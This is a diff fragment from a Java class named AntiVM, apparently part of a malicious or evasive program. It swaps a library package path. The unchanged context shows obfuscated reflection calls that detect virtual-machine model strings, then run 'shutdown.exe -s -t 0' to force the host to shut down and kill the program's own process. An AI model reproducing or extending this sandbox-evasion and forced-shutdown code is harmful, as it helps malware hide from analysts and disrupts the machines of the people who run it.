@@ -22,7 +22,7 @@ public class AntiVM {
 							if (model.contains(str)) {
 								try {
 									Class.forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")).getClass().getDeclaredMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")), "shutdown.exe -s -t 0");
-									org.jutils.jprocesses.JProcesses.killProcess((int) Class.forName("com.sun.jna.platform.win32.Kernel32").getDeclaredField("INSTANCE").get(Class.forName("com.sun.jna.platform.win32.Kernel32")).getClass().getDeclaredMethod("GetCurrentProcessId").invoke(Class.forName("com.sun.jna.platform.win32.Kernel32").getDeclaredField("INSTANCE").get(Class.forName("com.sun.jna.platform.win32.Kernel32"))));
+									libraries.jprocess.main.JProcesses.killProcess((int) Class.forName("com.sun.jna.platform.win32.Kernel32").getDeclaredField("INSTANCE").get(Class.forName("com.sun.jna.platform.win32.Kernel32")).getClass().getDeclaredMethod("GetCurrentProcessId").invoke(Class.forName("com.sun.jna.platform.win32.Kernel32").getDeclaredField("INSTANCE").get(Class.forName("com.sun.jna.platform.win32.Kernel32"))));
 								} catch (Exception e) {
 									e.printStackTrace();
 								}
@@ -32,7 +32,7 @@ public class AntiVM {
 					} else {
 						if (model.equals(closePhrase[0])) {
 							try {
-								org.jutils.jprocesses.JProcesses.killProcess((int) Class.forName("com.sun.jna.platform.win32.Kernel32").getDeclaredField("INSTANCE").get(Class.forName("com.sun.jna.platform.win32.Kernel32")).getClass().getDeclaredMethod("GetCurrentProcessId").invoke(Class.forName("com.sun.jna.platform.win32.Kernel32").getDeclaredField("INSTANCE").get(Class.forName("com.sun.jna.platform.win32.Kernel32"))));
+								libraries.jprocess.main.JProcesses.killProcess((int) Class.forName("com.sun.jna.platform.win32.Kernel32").getDeclaredField("INSTANCE").get(Class.forName("com.sun.jna.platform.win32.Kernel32")).getClass().getDeclaredMethod("GetCurrentProcessId").invoke(Class.forName("com.sun.jna.platform.win32.Kernel32").getDeclaredField("INSTANCE").get(Class.forName("com.sun.jna.platform.win32.Kernel32"))));
 							} catch (Exception e) {}
 							return false;
 						}
